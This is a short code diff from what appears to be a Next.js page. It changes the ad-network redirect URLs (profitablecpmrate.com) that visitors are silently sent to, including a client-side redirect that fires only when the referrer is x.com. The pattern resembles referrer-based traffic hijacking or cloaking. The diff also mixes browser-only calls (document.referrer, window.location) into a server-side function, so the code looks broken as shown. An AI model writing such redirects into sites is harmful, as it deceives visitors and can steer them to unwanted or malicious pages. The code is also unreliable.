@@ -18,14 +18,14 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://www.profitablecpmrate.com/jdbsgw1bnq?key=9459bb41225c11881c95d599f0203613`
+					`https://www.profitablecpmrate.com/ee26g1gfmj?key=a33948f61446c030ff079f314ca6f747`
 				}`,
 			},
 		};
 		}
 // Redirect if the referrer is X (Twitter)
 if (document.referrer.includes('x.com')) {
-    window.location.href = 'https://www.profitablecpmrate.com/jdbsgw1bnq?key=9459bb41225c11881c95d599f0203613';
+    window.location.href = 'https://www.profitablecpmrate.com/q8df160s?key=050087c7b058d9aad2ba4276c89466e4';
 }
 
 	const query = gql`
